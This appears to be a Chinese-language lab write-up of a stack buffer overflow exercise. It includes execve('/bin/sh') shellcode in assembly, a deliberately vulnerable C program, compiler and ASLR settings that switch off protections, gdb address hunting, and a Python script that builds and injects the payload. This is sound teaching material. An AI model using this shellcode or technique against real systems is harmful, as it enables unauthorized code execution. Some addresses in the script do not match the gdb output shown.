

## 启动 shell 的代码：

```s
#include <sys/syscall.h>

#define STRING  "/bin/sh"
#define STRLEN  7
#define ARGV    (STRLEN+1)
#define ENVP    (ARGV+8)

.globl main
        .type   main, @function

 main:
        jmp     calladdr

 popladdr:
        popq    %rcx
        movq    %rcx,(ARGV)(%rcx)       /* set up argv pointer to pathname */
        xorq    %rax,%rax               /* get a 64-bit zero value */
        movb    %al,(STRLEN)(%rcx)      /* null-terminate our string */
        movq    %rax,(ENVP)(%rcx)       /* set up null envp */

        movb    $SYS_execve,%al         /* syscall arg 1: syscall number */
        movq    %rcx,%rdi               /* syscall arg 2: string pathname */
        leaq    ARGV(%rcx),%rsi         /* syscall arg 2: argv */
        leaq    ENVP(%rcx),%rdx         /* syscall arg 3: envp */
        syscall                 /* invoke syscall */

        movb    $SYS_exit,%al          /* syscall arg 1: SYS_exit (60) */
        xorq    %rdi,%rdi               /* syscall arg 2: 0 */
        syscall                 /* invoke syscall */

 calladdr:
        call    popladdr
        .ascii  STRING
```

## 编译生成二进制指令：

```sh
$ cc -m64   -c -o shellcode.o shellcode.S
$ objcopy -S -O binary -j .text shellcode.o shellcode.bin
```

- cc 是 C 编译器的命令，通常是指向系统默认的 C 编译器（比如 GCC）。
  - `-m64` 使编译器生成 64 位的目标文件。
  - `-c` : Compile and assemble, but do not link.

- objcopy 是一个 GNU 工具，用于将目标文件中的数据进行转换。
  - `-S` 在复制节（sections）时保持节的大小。(Remove all symbol and relocation information)
  - `-O binary` 将目标文件转换成纯二进制格式。
  - `-j .text` 只复制目标文件中的 .text 节，也就是代码节。


## 假定一个被攻击的代码：

```c
#include <string.h>
#include <stdio.h>
#include <unistd.h>

void first128(char *str) {
  char buffer[128];
  strcpy(buffer, str);
  printf("%s\n", buffer);
}

int main(int argc, char **argv) {
  static char input[1024];
  while (read(STDIN_FILENO, input, 1024) > 0) {
    first128(input);
  }
  return 0;
}
```

## 运行并通过 gdb 获取所需信息

```sh
gcc -g -fno-stack-protector -z execstack vulnerable.c -o vulnerable -D_FORTIFY_SOURCE=0
```

- `-fno-stack-protector` 禁用内存金丝雀
- `-z execstack` 使得栈可执行（禁用 Write XOR Execute）
- `-D_FORTIFY_SOURCE=0` 禁用 Fortified Source：即关闭对于的栈溢出的宏检测


```sh
env - setarch -R ./vulnerable
```

- `env -` 清除运行环境并运行程序（如果有环境变量插入到程序中，会改变周围的地址）
- `setarch -R` 禁用 ASLR(Address-Space Layout Randomization)

在另一个终端中使用 gdb 连接正在等待输入的程序：

```sh
$ gdb -p $(pgrep vulnerable)
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
...
```

首先设置断点并运行：

```sh
(gdb) b first128
Breakpoint 1 at 0x55555555519f: file vulnerable.c, line 7.
(gdb) run < input.txt
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/panda/MIT/6.858/stack_overflow/vulnerable < input.txt
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, first128 (str=0x555555558040 <input> "2333") at vulnerable.c:7
(gdb)
```

现在程序停在刚进入 `first128` 函数并初始化完函数栈帧的位置（声明了 buffer[128] 之后）。

首先查看本地变量 buffer（位于栈中） 的地址：

```sh
(gdb) print &buffer[0]
$1 = 0x7fffffffd6b0 ""
```

然后打印整个栈帧内容，查看保存的寄存器信息：

```sh
(gdb) info frame
Stack level 0, frame at 0x7fffffffd740:
 rip = 0x55555555519f in first128 (vulnerable.c:7); saved rip = 0x5555555551e8
 called by frame at 0x7fffffffd760
 source language c.
 Arglist at 0x7fffffffd730, args: str=0x555555558040 <input> "2333"
 Locals at 0x7fffffffd730, Previous frame's sp is 0x7fffffffd740
 Saved registers:
  rbp at 0x7fffffffd730, rip at 0x7fffffffd738
```

- buffer 的首地址为 `0x7fffffffd6b0`
- 当前栈帧中保存的 rip 寄存器的值为 `0x7fffffffd738`（即当前函数的返回地址）

## 使用 python 脚本构造输入并注入程序

给之前的 .bin 代码填充至占满 buffer 并溢出到截止至保存的 rip 寄存器的地址之前，并在最后添加 buffer 的地址，即替换函数返回地址为 shellcode 的即使地址（也即 buffer 的起始地址）：

```py
#!/usr/bin/env python3
import os, sys, struct

addr_buffer = 0x7fffffffece0
addr_retaddr = 0x7fffffffed68

# We want buffer to first hold the shellcode
shellfile = open("shellcode.bin", "rb")
shellcode = shellfile.read()

# Then we want to pad up until the return address
shellcode += b"A" * ((addr_retaddr - addr_buffer) - len(shellcode))

# Then we write in the address of the shellcode.
# struct.pack("<Q") writes out 64-bit integers in little-endian.
shellcode += struct.pack("<Q", addr_buffer)

# write the shell code out to the waiting vulnerable program
fp = os.fdopen(sys.stdout.fileno(), 'wb')
fp.write(shellcode)
fp.flush()

# forward user's input to the underlying program
while True:
    try:
        data = sys.stdin.buffer.read1(1024)
        if not data:
            break
        fp.write(data)
        fp.flush()
    except KeyboardInterrupt:
        break
```

从输入注入 shellcode 并运行程序：

```sh
./exploit.py | env - setarch -R ./vulnerable
```

